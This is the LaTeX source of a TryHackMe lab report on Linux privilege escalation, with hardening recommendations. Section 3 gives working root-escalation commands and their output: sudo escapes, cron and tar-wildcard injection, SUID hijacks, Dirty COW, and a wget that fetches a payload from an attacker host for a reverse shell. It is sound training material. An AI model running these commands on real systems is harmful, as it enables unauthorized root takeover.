\documentclass[11pt]{article}

% ---------- Packages ----------
\usepackage[a4paper,margin=2.2cm]{geometry}
\usepackage{xcolor}
\usepackage{graphicx}
\usepackage{fancyhdr}
\usepackage{titlesec}
\usepackage{enumitem}
\usepackage{tcolorbox}
\usepackage{listings}
\usepackage{hyperref}
\usepackage{booktabs}
\usepackage{longtable}
\usepackage{array}
\usepackage{float}

% ---------- Colors ----------
\definecolor{navy}{HTML}{0B1F3A}
\definecolor{teal}{HTML}{0E8C7F}
\definecolor{critical}{HTML}{C0392B}
\definecolor{high}{HTML}{E67E22}
\definecolor{medium}{HTML}{F1C40F}
\definecolor{lightgray}{HTML}{F4F6F8}
\definecolor{codebg}{HTML}{1E1E1E}
\definecolor{codefg}{HTML}{D4D4D4}

% ---------- Section styling ----------
\titleformat{\section}{\Large\bfseries\color{navy}}{\thesection}{0.5em}{}[{\color{teal}\titlerule[1.2pt]}]
\titleformat{\subsection}{\large\bfseries\color{navy}}{\thesubsection}{0.5em}{}

% ---------- Header/Footer ----------
\pagestyle{fancy}
\fancyhf{}
\renewcommand{\headrulewidth}{0.6pt}
\fancyhead[L]{\small\color{navy}\bfseries Linux PrivEsc -- Post-Exploitation Report}
\fancyhead[R]{\small\color{navy}TryHackMe Lab Environment}
\fancyfoot[C]{\small\thepage}

% ---------- Code listing style ----------
\lstdefinestyle{term}{
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize\color{codefg},
  breaklines=true,
  frame=single,
  rulecolor=\color{teal},
  framerule=0.6pt,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false,
  xleftmargin=2pt,
  xrightmargin=2pt,
  aboveskip=6pt,
  belowskip=6pt
}
\lstset{style=term}

% ---------- Helper environments ----------
\newtcolorbox{infobox}[1][]{colback=lightgray,colframe=teal,fonttitle=\bfseries,title={#1},boxrule=0.8pt,arc=1mm}
\newtcolorbox{severitybox}[2][]{colback=white,colframe=#2,fonttitle=\bfseries,coltitle=white,colbacktitle=#2,title={#1},boxrule=1pt,arc=1mm}

\newcommand{\fig}[4]{%
  \begin{figure}[H]
    \centering
    \includegraphics[width=#2\linewidth]{#1}
    \caption{#3}
    \label{#4}
  \end{figure}
}

\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}

% ============================================================
\begin{document}

% ---------------- TITLE PAGE ----------------
\begin{titlepage}
  \centering
  \vspace*{1cm}
  {\Huge\bfseries\color{navy} Post-Exploitation Report}\\[0.4cm]
  {\Large\color{teal} Linux Privilege Escalation -- TryHackMe}\\[1.5cm]

  \begin{tcolorbox}[colback=lightgray,colframe=navy,width=0.85\linewidth,arc=2mm,boxrule=1pt]
    \begin{tabular}{L{4cm}L{9cm}}
      \textbf{Assessment Type:} & Linux Local Privilege Escalation (Authorized Lab Exercise) \\[4pt]
      \textbf{Target Environment:} & TryHackMe -- ``Linux PrivEsc'' Room (Debian VM by Sagi Shahar, updated by Tib3rius) \\[4pt]
      \textbf{Target Host:} & 10.10.25.177 / 10.10.22.80 (assigned lab IP, varies per session) \\[4pt]
      \textbf{Assessor:} & Eyad El-Taher \\[4pt]
      \textbf{Program:} & DEPI -- Vulnerability Analyst and Penetration Tester Track \\[4pt]
      \textbf{Date:} & \today \\
    \end{tabular}
  \end{tcolorbox}

  \vfill
  \begin{tcolorbox}[colback=white,colframe=critical,arc=1mm,boxrule=1pt,width=0.85\linewidth]
    \small\textbf{Authorized Scope Only.} All privilege escalation and pivoting activity described
    in this report was performed exclusively within the TryHackMe-assigned lab environment for the
    ``Linux PrivEsc'' room. No technique described here was executed against any system outside
    this authorized, isolated lab scope.
  \end{tcolorbox}
  \vspace{1cm}
\end{titlepage}

\tableofcontents
\newpage

% ============================================================
\section{1. Target Information}

\begin{infobox}[Scope Summary]
\begin{tabular}{L{4cm}L{10cm}}
\textbf{Hostname / Label} & \texttt{debian} (TryHackMe lab instance) \\
\textbf{IP Address} & 10.10.25.177 (initial low-privilege access), 10.10.22.80 (later session) \\
\textbf{Operating System} & Debian GNU/Linux, kernel 2.6.32-5-amd64, x86\_64 \\
\textbf{Initial Account} & \texttt{user} (uid=1000), password \texttt{password321} \\
\textbf{Exposed Services} & \texttt{22/tcp} (SSH), local MySQL service running as root with no root password, local Apache/NFS/cron infrastructure \\
\textbf{Assessment Scope} & Local privilege escalation and post-exploitation review of an already-authenticated low-privileged shell, strictly within the assigned TryHackMe lab machine \\
\end{tabular}
\end{infobox}

The target is an intentionally vulnerable Debian VM built for the TryHackMe ``Linux PrivEsc''
room. Access starts from a standard low-privileged SSH account (\texttt{user}), and the objective
of the exercise was to enumerate and exploit a broad range of common Linux privilege-escalation
weaknesses -- misconfigured services, weak file permissions, sudo misconfiguration, cron job
abuse, vulnerable SUID binaries, credential exposure, NFS misconfiguration, and an unpatched
kernel -- to reach \texttt{root} through as many independent paths as possible.

% ============================================================
\section{2. Initial Access Summary}

Initial access to the target was already provided as part of the lab setup: an SSH session as the
low-privileged \texttt{user} account.

\begin{lstlisting}
ssh user@10.10.25.177
Password: password321
\end{lstlisting}

Running \texttt{id} immediately after login confirmed the starting privilege level:
\begin{lstlisting}
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),
29(audio),30(dip),44(video),46(plugdev)
\end{lstlisting}

\fig{pics/pic1.png}{0.85}{Initial SSH login as the low-privileged \texttt{user} account, confirmed with \texttt{id}.}{fig:pic1}

From this single foothold, seventeen independent privilege-escalation techniques were identified
and exploited, each of which is detailed in Section~3. Every technique below was demonstrated
starting from this same low-privileged shell.

% ============================================================
\section{3. Privilege Escalation Findings}

\subsection{3.1 Service Misconfiguration -- MySQL UDF Exploitation}
The local MySQL service ran as root with an empty root password. This was abused using a
User-Defined-Function (UDF) exploit (\texttt{raptor\_udf2.c}) to execute arbitrary system commands
as root.

\begin{lstlisting}
mysql -u root
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
\end{lstlisting}

\fig{pics/pic2.png}{0.95}{Creating the malicious \texttt{do\_system} UDF from a compiled shared object loaded via MySQL.}{fig:pic2}
\fig{pics/pic3.png}{0.85}{Using \texttt{do\_system} to copy \texttt{/bin/bash} to \texttt{/tmp/rootbash} with the SUID bit set.}{fig:pic3}

Exiting MySQL and running the resulting SUID binary yielded an immediate root shell:
\begin{lstlisting}
/tmp/rootbash -p
id  -> uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
whoami -> root
\end{lstlisting}
\fig{pics/pic4.png}{0.85}{Root shell obtained via the SUID copy of bash created through the MySQL UDF exploit.}{fig:pic4}

\subsection{3.2 Weak File Permissions -- World-Readable \texttt{/etc/shadow}}
\texttt{/etc/shadow} was found with permissive mode \texttt{-rw-r--rw-}, making it readable (and
writable) by any local user, directly exposing every account's password hash.
\begin{lstlisting}
ls -l /etc/shadow
cat /etc/shadow
\end{lstlisting}
\fig{pics/pic5.png}{0.95}{World-readable \texttt{/etc/shadow} exposing all local password hashes, including root's.}{fig:pic5}

The exposed root hash was cracked offline with John the Ripper against the \texttt{rockyou.txt}
wordlist:
\begin{lstlisting}
john --wordlist=rockyou.txt hash.txt
\end{lstlisting}
\fig{pics/pic6.png}{0.9}{John the Ripper cracking the disclosed SHA-512 (\texttt{\$6\$}) root password hash.}{fig:pic6}

Because \texttt{/etc/shadow} was also \emph{writable}, an alternative path was demonstrated: a
freshly generated hash for a known password was crafted and written directly into the file,
replacing root's hash so that its plaintext value became known.
\begin{lstlisting}
cp /etc/shadow /tmp/shadow.bkup
mkpasswd -m sha-512 pass123
vim /etc/shadow   # replace root's hash with the newly generated one
su root           # login with "pass123"
\end{lstlisting}
\fig{pics/pic7.png}{0.95}{Overwriting root's hash in the writable \texttt{/etc/shadow} file with a known password hash, then switching to root.}{fig:pic7}

\subsection{3.3 Weak File Permissions -- World-Writable \texttt{/etc/passwd}}
\texttt{/etc/passwd} was also found writable by the low-privileged user
(\texttt{-rw-r--rw-}). This allowed a new password hash to be generated and pasted directly onto
root's password field in \texttt{/etc/passwd}, bypassing the shadow file entirely.
\begin{lstlisting}
openssl passwd pass456
vim /etc/passwd    # set root:<generated-hash>:0:0:root:/root:/bin/bash
su root
\end{lstlisting}
\fig{pics/pic8.png}{0.95}{Injecting a known password hash into a writable \texttt{/etc/passwd} and escalating via \texttt{su}.}{fig:pic8}

\subsection{3.4 Sudo Misconfiguration -- GTFOBins Shell Escapes}
Checking sudo rights revealed a long list of binaries the \texttt{user} account could run as root
without a password:
\begin{lstlisting}
sudo -l
(root) NOPASSWD: /usr/sbin/iftop, /usr/bin/find, /usr/bin/nano, /usr/bin/vim,
                 /usr/bin/man, /usr/bin/awk, /usr/bin/less, /usr/bin/ftp,
                 /usr/bin/nmap, /usr/sbin/apache2, /bin/more
\end{lstlisting}
\fig{pics/pic9.png}{0.95}{\texttt{sudo -l} output listing multiple NOPASSWD binaries exploitable for privilege escalation.}{fig:pic9}

Several of these are documented GTFOBins shell-escape vectors and were each used to obtain a root
shell independently:
\begin{itemize}
  \item \textbf{iftop:} \texttt{sudo iftop} then dropping to a shell from its interactive interface.
  \item \textbf{find:} \texttt{sudo find . -exec /bin/sh \textbackslash; -quit}
  \item \textbf{vim:} \texttt{sudo vim -c ':!/bin/bash'}
  \item \textbf{man:} \texttt{sudo man man} then invoking a shell from the pager.
  \item \textbf{awk:} \texttt{sudo awk 'BEGIN \{system("/bin/bash")\}'}
\end{itemize}

\fig{pics/pic10.png}{0.8}{Root shell obtained through \texttt{sudo iftop}.}{fig:pic10}
\fig{pics/pic11.png}{0.8}{Root shell obtained through \texttt{sudo find ... -exec /bin/sh}.}{fig:pic11}
\fig{pics/pic12.png}{0.8}{Root shell obtained through \texttt{sudo vim -c ':!/bin/bash'}.}{fig:pic12}
\fig{pics/pic13.png}{0.7}{\texttt{sudo man man} dropping into a root-owned man page shell.}{fig:pic13}
\fig{pics/pic14.png}{0.8}{Root shell obtained through \texttt{sudo awk 'BEGIN \{system("/bin/bash")\}'}.}{fig:pic14}

\subsection{3.5 Sudo Environment Variable Abuse -- \texttt{LD\_LIBRARY\_PATH}}
The \texttt{sudo -l} output also showed that \texttt{env\_keep} preserved
\texttt{LD\_PRELOAD} and \texttt{LD\_LIBRARY\_PATH} across sudo invocations, and that
\texttt{/usr/sbin/apache2} could be run as root via sudo. A malicious shared library implementing
a function referenced by Apache (\texttt{libcrypt.so.1}) was compiled and placed in \texttt{/tmp},
then loaded ahead of the legitimate library by pointing \texttt{LD\_LIBRARY\_PATH} at it during the
sudo call.
\begin{lstlisting}
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
id  -> uid=0(root) gid=0(root)
\end{lstlisting}
\fig{pics/pic15.png}{0.9}{Hijacking Apache's dynamic library resolution through sudo's preserved \texttt{LD\_LIBRARY\_PATH} to gain root.}{fig:pic15}

\subsection{3.6 Cron Job Abuse -- PATH Hijack via a Root-Owned Script}
The root-owned system crontab (\texttt{/etc/crontab}) revealed a custom job running
\texttt{/usr/local/bin/overwrite.sh} as root on every cron tick, and the script itself was found to
be user-writable.
\begin{lstlisting}
cat /etc/crontab
locate overwrite.sh
which vim
vim /usr/local/bin/overwrite.sh   # append a SUID-copy payload
\end{lstlisting}
\fig{pics/pic16.png}{0.95}{Discovering a writable, root-executed cron script (\texttt{overwrite.sh}) via \texttt{/etc/crontab}.}{fig:pic16}

The script was modified to create another SUID copy of bash. After the next cron execution, the
resulting binary was run to obtain root:
\begin{lstlisting}
chmod +x /home/user/overwrite.sh
/tmp/rootbash -p
id -> euid=0(root)
rm /tmp/rootbash; exit
\end{lstlisting}
\fig{pics/pic17.png}{0.95}{Weaponised cron script producing a root-owned SUID shell once executed by cron.}{fig:pic17}

\subsection{3.7 Cron Job Abuse -- Tar Wildcard Injection}
A second cron-driven script, \texttt{/usr/local/bin/compress.sh}, ran \texttt{tar czf
/tmp/backup.tar.gz *} inside \texttt{/home/user} as root. Because \texttt{tar} interprets certain
filenames as command-line options when wildcards are expanded, this is exploitable via the classic
``tar wildcard injection'' technique.
\begin{lstlisting}
cat /usr/local/bin/compress.sh
wget http://10.2.12.26/shell.elf
\end{lstlisting}
\fig{pics/pic18.png}{0.95}{Root-executed \texttt{compress.sh} calling \texttt{tar czf * } inside the user's writable home directory; a payload is staged with \texttt{wget}.}{fig:pic18}

Two specially named files were created so that \texttt{tar}'s checkpoint feature would execute the
staged payload as root the next time the cron job ran:
\begin{lstlisting}
chmod +x shell.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
\end{lstlisting}
\fig{pics/pic19.png}{0.85}{Crafting \texttt{--checkpoint} / \texttt{--checkpoint-action} filenames to hijack the root-run \texttt{tar} command.}{fig:pic19}

Once cron re-ran \texttt{compress.sh}, the payload executed as root and connected back to a
listener on the attacker host:
\begin{lstlisting}
nc -lvp 4444
# connection received, id -> uid=0(root) gid=0(root) groups=0(root)
\end{lstlisting}
\fig{pics/pic20.png}{0.85}{Root-level reverse shell received after the poisoned cron job executed the tar wildcard payload.}{fig:pic20}

\subsection{3.8 SUID Binary Discovery}
A full filesystem sweep for SUID/SGID binaries was performed to identify non-standard,
custom-installed executables worth investigating further:
\begin{lstlisting}
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
\end{lstlisting}
\fig{pics/pic21.png}{0.95}{SUID/SGID enumeration revealing several custom binaries (\texttt{suid-so}, \texttt{suid-env}, \texttt{suid-env2}) alongside a vulnerable Exim version.}{fig:pic21}

This scan surfaced three deliberately vulnerable custom SUID binaries
(\texttt{/usr/local/bin/suid-so}, \texttt{suid-env}, \texttt{suid-env2}) and an outdated,
SUID-flagged Exim mail binary -- each exploited individually below.

\subsection{3.9 SUID Binary Abuse -- CVE-2016-1531 (Exim 4.84-3)}
The SUID Exim binary (version 4.84-3) is vulnerable to a known local root exploit
(CVE-2016-1531), abusing Exim's Perl-startup environment handling.
\begin{lstlisting}
sh /home/user/tools/suid/exim/cve-2016-1531.sh
id -> uid=0(root) gid=1000(user) groups=0(root)
\end{lstlisting}
\fig{pics/pic22.png}{0.85}{CVE-2016-1531 exploit script granting a root-privileged shell via the vulnerable SUID Exim binary.}{fig:pic22}

\subsection{3.10 SUID Binary Abuse -- Shared Object Hijacking}
Tracing the custom \texttt{suid-so} binary with \texttt{strace} showed it attempting to load a
missing, user-controllable shared object from the invoking user's home directory
(\texttt{/home/user/.config/libcalc.so}).
\begin{lstlisting}
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
mkdir /home/user/.config
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
/usr/local/bin/suid-so
id -> uid=0(root) gid=1000(user) egid=50(staff)
\end{lstlisting}
\fig{pics/pic23.png}{0.95}{Hijacking the SUID binary's missing shared-object lookup path to load an attacker-controlled library and gain root.}{fig:pic23}

\subsection{3.11 SUID Binary Abuse -- \texttt{PATH} Hijacking}
The \texttt{suid-env} binary was found (via \texttt{strings}) to call the \texttt{service}
command without specifying its full path, meaning it relies on the invoking user's \texttt{PATH}.
\begin{lstlisting}
ls -l /usr/local/bin/suid-env
strings /usr/local/bin/suid-env   # reveals a bare "service" call
\end{lstlisting}
\fig{pics/pic24.png}{0.95}{\texttt{strings} output confirming \texttt{suid-env} invokes \texttt{service} without an absolute path.}{fig:pic24}

A malicious \texttt{service} binary that spawns a root shell was compiled and placed earlier in
\texttt{PATH} than the real one:
\begin{lstlisting}
gcc -o service /home/user/tools/suid/service.c
PATH=.:$PATH /usr/local/bin/suid-env
id -> uid=0(root) gid=0(root)
\end{lstlisting}
\fig{pics/pic25.png}{0.9}{PATH-hijack payload (\texttt{setuid(0); system("/bin/bash -p")}) executed in place of the real \texttt{service} command, yielding root.}{fig:pic25}

\subsection{3.12 SUID Binary Abuse -- Function Import (\texttt{suid-env2})}
The related \texttt{suid-env2} binary called \texttt{service} through a bash subshell, which
allowed the same command name to be hijacked using an exported bash \emph{function} instead of a
PATH trick.
\begin{lstlisting}
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
id -> uid=0(root) gid=0(root)
\end{lstlisting}
\fig{pics/pic26.png}{0.9}{Exporting a malicious bash function named \texttt{service} to hijack \texttt{suid-env2}'s internal call and obtain root.}{fig:pic26}

\subsection{3.13 SUID Binary Abuse -- Bash Debugging Trap (\texttt{PS4}/\texttt{SHELLOPTS})}
As a third, independent path against the same \texttt{suid-env2} binary, bash's built-in
\texttt{xtrace} debugging feature was abused: setting \texttt{SHELLOPTS=xtrace} together with a
malicious \texttt{PS4} prompt causes bash to execute attacker-supplied shell code before every
traced command, inheriting the SUID process's privileges.
\begin{lstlisting}
env -i SHELLOPTS=xtrace \
  PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' \
  /usr/local/bin/suid-env2
\end{lstlisting}
\fig{pics/pic27.png}{0.95}{Triggering \texttt{PS4}-based command injection during \texttt{suid-env2}'s internal bash script execution.}{fig:pic27}

Once the traced script executed the injected \texttt{PS4} payload, the resulting SUID copy of bash
provided a full root shell:
\begin{lstlisting}
/tmp/rootbash -p
id -> euid=0(root) egid=0(root)
rm /tmp/rootbash; exit
\end{lstlisting}
\fig{pics/pic28.png}{0.9}{Root shell obtained from the \texttt{PS4}-injected SUID copy of bash.}{fig:pic28}

\subsection{3.14 Credential Exposure -- Reused Password in Bash History}
The low-privileged user's shell history retained a plaintext MySQL connection command, including
the password used to connect. That password was reused for the local \texttt{root} account.
\begin{lstlisting}
cat ~/.*history | grep mysql
# mysql -h somehost.local -u root -p<REDACTED>
su root
id -> uid=0(root) gid=0(root)
\end{lstlisting}
\fig{pics/pic29.png}{0.9}{Root credential recovered from a plaintext MySQL command left in shell history, then reused for local root access.}{fig:pic29}

\subsection{3.15 Credential Exposure -- Plaintext Credentials in OpenVPN Configuration}
An OpenVPN client configuration file in the user's home directory (\texttt{myvpn.ovpn})
referenced an external authentication file, which stored the root credentials in plaintext.
\begin{lstlisting}
cat /home/user/myvpn.ovpn   # auth-user-pass /etc/openvpn/auth.txt
cat /etc/openvpn/auth.txt   # root / password123
su root
id -> uid=0(root) gid=0(root)
\end{lstlisting}
\fig{pics/pic30.png}{0.95}{Plaintext root credentials disclosed via an OpenVPN \texttt{auth.txt} referenced from a user-readable \texttt{.ovpn} config.}{fig:pic30}

\subsection{3.16 Credential Exposure -- World-Readable SSH Private Key}
A private SSH key belonging to root (\texttt{root\_key}) was found world-readable under a hidden
\texttt{/.ssh} directory. Copied to the attacker machine and used directly, it granted an
authenticated root SSH session with no password required.
\begin{lstlisting}
# On Kali:
chmod 600 root-key
ssh -i root-key root@10.10.22.80
id -> uid=0(root) gid=0(root) groups=0(root)
\end{lstlisting}
\fig{pics/pic31.png}{0.9}{Direct root SSH access using a world-readable private key recovered from the target filesystem.}{fig:pic31}

\subsection{3.17 NFS Misconfiguration -- \texttt{no\_root\_squash}}
The \texttt{/tmp} share exported via NFS was configured with \texttt{no\_root\_squash}, meaning a
file created as root on the attacking client keeps its root ownership on the target. A SUID
payload was staged on the mounted share from the attacker's root account and executed directly on
the target as the unprivileged user.
\begin{lstlisting}
# On the target, after the payload was staged via the NFS mount:
cd /tmp
ls   # backup.tar.gz  libcrypt.so.1  preload.so  root.pm  shell.elf  useless
/tmp/shell.elf
id -> uid=1000(user) euid=0(root) egid=0(root)
\end{lstlisting}
\fig{pics/pic32.png}{0.9}{Root-owned SUID payload dropped through an \texttt{no\_root\_squash} NFS share, executed to gain root on the target.}{fig:pic32}

\subsection{3.18 Kernel Exploit -- Dirty COW (CVE-2016-5195)}
The Debian VM ran an old 2.6.32 kernel. Running Linux Exploit Suggester 2 against it confirmed
several viable kernel exploits, most notably Dirty COW (CVE-2016-5195).
\begin{lstlisting}
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
\end{lstlisting}
\fig{pics/pic33.png}{0.95}{Linux Exploit Suggester 2 identifying Dirty COW (CVE-2016-5195) among the viable kernel exploits for this 2.6.32 kernel.}{fig:pic33}

The Dirty COW proof-of-concept was compiled and run, replacing \texttt{/usr/bin/passwd} with a
version that spawns a root shell:
\begin{lstlisting}
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
/usr/bin/passwd
id -> uid=0(root) gid=1000(user) groups=0(root),...
\end{lstlisting}
\fig{pics/pic34.png}{0.9}{Dirty COW kernel exploit patching \texttt{/usr/bin/passwd} in memory and yielding a root shell.}{fig:pic34}

% ============================================================
\section{4. Credentials Identified}

\begin{center}
\begin{tabular}{L{3cm}L{3.6cm}L{6.5cm}}
\toprule
\textbf{Account} & \textbf{Value} & \textbf{Source} \\
\midrule
user & password321 (provided) & Lab-issued SSH login credential \\
root & MD5/SHA-512 hash & Cracked offline from world-readable \texttt{/etc/shadow} via John the Ripper \\
root & pass123 / pass456 (attacker-chosen) & Injected directly into writable \texttt{/etc/shadow} and \texttt{/etc/passwd} \\
root & MySQL password (redacted) & Plaintext command recovered from user's bash history, reused as the local root password \\
root & password123 & Plaintext \texttt{/etc/openvpn/auth.txt} referenced by a readable \texttt{.ovpn} config \\
root & SSH private key (\texttt{root\_key}) & World-readable key file found under \texttt{/.ssh} \\
\bottomrule
\end{tabular}
\end{center}

All credentials above were only recovered and used within the authorized lab scope; no values were
retained or reused outside the assessment.

% ============================================================
\section{5. Internal Assets Discovered}

\begin{center}
\begin{tabular}{L{4.4cm}L{9.6cm}}
\toprule
\textbf{Asset} & \textbf{Relevance} \\
\midrule
Local MySQL service (root, no password) & Enabled UDF-based command execution as root \\
\texttt{/etc/shadow}, \texttt{/etc/passwd} & World-readable/writable, exposing and allowing modification of every account's credentials \\
Sudo-permitted binaries (\texttt{iftop}, \texttt{find}, \texttt{vim}, \texttt{man}, \texttt{awk}, \texttt{apache2}, etc.) & Multiple independent GTFOBins-style root shell escapes \\
\texttt{/etc/crontab}, \texttt{overwrite.sh}, \texttt{compress.sh} & Root-run scheduled jobs with insecure permissions/wildcard usage \\
Custom SUID binaries (\texttt{suid-so}, \texttt{suid-env}, \texttt{suid-env2}) & Deliberately vulnerable binaries demonstrating shared-object, PATH, function-import, and \texttt{PS4} trace hijacks \\
Outdated SUID Exim 4.84-3 & Vulnerable to CVE-2016-1531 local root exploit \\
Bash history file & Leaked a reusable MySQL/root password \\
\texttt{myvpn.ovpn} / \texttt{/etc/openvpn/auth.txt} & Leaked plaintext root credentials \\
World-readable \texttt{root\_key} under \texttt{/.ssh} & Direct root SSH access with no password \\
NFS export of \texttt{/tmp} with \texttt{no\_root\_squash} & Allowed root-owned payload delivery from an external client \\
Kernel 2.6.32 (Dirty COW, CVE-2016-5195) & Unpatched kernel vulnerable to a well-known local root exploit \\
\bottomrule
\end{tabular}
\end{center}

% ============================================================
\section{6. Potential Impact}

With any single low-privileged foothold on this host, an attacker has at least seventeen
independent, low-effort paths to full root compromise. In a production environment, this would
mean:

\begin{itemize}
  \item \textbf{Total loss of confidentiality, integrity, and availability} of the host, since
        root access allows arbitrary reading, modification, or destruction of any data, service,
        or configuration on the system.
  \item \textbf{Credential compromise beyond this single host} -- reused MySQL, OpenVPN, and SSH
        key material recovered here could grant access to other internal systems that share the
        same credentials.
  \item \textbf{Persistence and stealth} -- root access via cron abuse, SUID backdoors, or a
        planted SSH key allows an attacker to maintain long-term, hard-to-detect access even after
        the original entry vector is patched.
  \item \textbf{Lateral movement} -- the NFS misconfiguration and leaked VPN/SSH credentials
        suggest this host could be used as a pivot point into other segments of the network.
  \item \textbf{Redundant attack surface} -- because so many independent misconfigurations exist
        simultaneously, patching any single issue would not meaningfully reduce overall risk; the
        environment requires systemic hardening rather than a one-off fix.
\end{itemize}

% ============================================================
\section{7. Security Recommendations}

\begin{enumerate}[label=R\arabic*.]
  \item \textbf{Never run database services as root} or with a blank root password; create a
        dedicated, minimally-privileged MySQL service account and disable UDF loading from
        untrusted paths.
  \item \textbf{Enforce strict permissions on \texttt{/etc/shadow} and \texttt{/etc/passwd}}
        (\texttt{640} and \texttt{644} root-owned respectively, never group/world-writable).
  \item \textbf{Minimize \texttt{sudo} NOPASSWD entries} to only what is strictly required, and
        avoid granting sudo rights to any binary with a known GTFOBins shell-escape technique
        (editors, pagers, network tools, interpreters, etc.).
  \item \textbf{Do not preserve \texttt{LD\_PRELOAD}/\texttt{LD\_LIBRARY\_PATH}} (or any other
        environment variable that influences dynamic library resolution) across \texttt{sudo}
        invocations; use \texttt{Defaults env\_reset} without exceptions for these variables.
  \item \textbf{Lock down permissions on all root-executed cron scripts and their directories},
        and never use unquoted wildcard expansion (\texttt{tar czf ... *}) in scripts that run
        with elevated privileges.
  \item \textbf{Audit and minimize SUID/SGID binaries system-wide}; remove the bit from anything
        that does not strictly require it, and patch or remove outdated software (e.g. Exim
        4.84-3) known to be vulnerable.
  \item \textbf{Ensure SUID binaries call other executables using absolute, fully-qualified
        paths} and a sanitized, minimal \texttt{PATH}/environment, never a bare command name that
        depends on the invoking user's shell state.
  \item \textbf{Never store credentials in shell history, VPN configuration files, or any
        plaintext file}; use a secrets manager or, at minimum, restrict such files to
        \texttt{600} permissions and rotate any credentials found exposed.
  \item \textbf{Restrict SSH private key file permissions to \texttt{600}} and audit for stray
        key material left in world-readable locations.
  \item \textbf{Never export NFS shares with \texttt{no\_root\_squash}} unless absolutely
        necessary and tightly scoped; prefer \texttt{root\_squash} (the secure default) for all
        shares that do not have an explicit, documented need otherwise.
  \item \textbf{Keep the kernel and core system packages patched}, and prioritize eliminating
        legacy kernels vulnerable to well-known local-root exploits such as Dirty COW.
\end{enumerate}

% ============================================================
\section{8. Evidence \& Screenshots}

All screenshots supporting the claims in this report were captured directly during the assessment
and are referenced inline throughout Section~3 (Figures~\ref{fig:pic1}--\ref{fig:pic34}). A summary
index is provided below for quick cross-reference.

\begin{center}
\begin{tabular}{L{1.6cm}L{11.5cm}}
\toprule
\textbf{Figure} & \textbf{Evidence Captured} \\
\midrule
Fig.~\ref{fig:pic1} & Initial low-privileged SSH access and \texttt{id} output \\
Fig.~\ref{fig:pic2}--\ref{fig:pic4} & MySQL UDF exploitation to root \\
Fig.~\ref{fig:pic5}--\ref{fig:pic7} & Weak \texttt{/etc/shadow} permissions -- disclosure, cracking, and direct hash overwrite \\
Fig.~\ref{fig:pic8} & Weak \texttt{/etc/passwd} permissions -- direct hash injection \\
Fig.~\ref{fig:pic9}--\ref{fig:pic14} & Sudo misconfiguration -- \texttt{sudo -l} and five GTFOBins shell escapes \\
Fig.~\ref{fig:pic15} & Sudo \texttt{LD\_LIBRARY\_PATH} abuse against Apache \\
Fig.~\ref{fig:pic16}--\ref{fig:pic17} & Cron job PATH/script hijack (\texttt{overwrite.sh}) \\
Fig.~\ref{fig:pic18}--\ref{fig:pic20} & Cron job tar wildcard injection (\texttt{compress.sh}) \\
Fig.~\ref{fig:pic21} & SUID/SGID binary discovery sweep \\
Fig.~\ref{fig:pic22} & CVE-2016-1531 Exim exploit \\
Fig.~\ref{fig:pic23} & \texttt{suid-so} shared-object hijack \\
Fig.~\ref{fig:pic24}--\ref{fig:pic25} & \texttt{suid-env} PATH hijack \\
Fig.~\ref{fig:pic26} & \texttt{suid-env2} function-import hijack \\
Fig.~\ref{fig:pic27}--\ref{fig:pic28} & \texttt{suid-env2} \texttt{PS4}/\texttt{SHELLOPTS} trace injection \\
Fig.~\ref{fig:pic29} & Reused root credential from bash history \\
Fig.~\ref{fig:pic30} & Plaintext root credential from OpenVPN config \\
Fig.~\ref{fig:pic31} & World-readable SSH private key used for direct root login \\
Fig.~\ref{fig:pic32} & NFS \texttt{no\_root\_squash} payload delivery \\
Fig.~\ref{fig:pic33}--\ref{fig:pic34} & Kernel exploit suggester and Dirty COW execution \\
\bottomrule
\end{tabular}
\end{center}

% ============================================================
\section{9. Conclusion}

This assessment of the TryHackMe ``Linux PrivEsc'' room demonstrates just how many independent,
low-sophistication paths to root can coexist on a single misconfigured Linux host. Across
seventeen distinct techniques -- spanning service misconfiguration, weak file permissions, sudo
abuse, cron job weaknesses, vulnerable SUID binaries, credential exposure, NFS misconfiguration,
and an unpatched kernel -- not one required advanced exploit development; each relied on a
well-documented, easily preventable misconfiguration. The exercise reinforces that Linux
privilege-escalation defense is fundamentally about disciplined configuration hygiene: minimal
privileges, correct file permissions, sanitized environments for privileged processes, no
plaintext credentials at rest, and a consistent patching cadence.

\end{document}
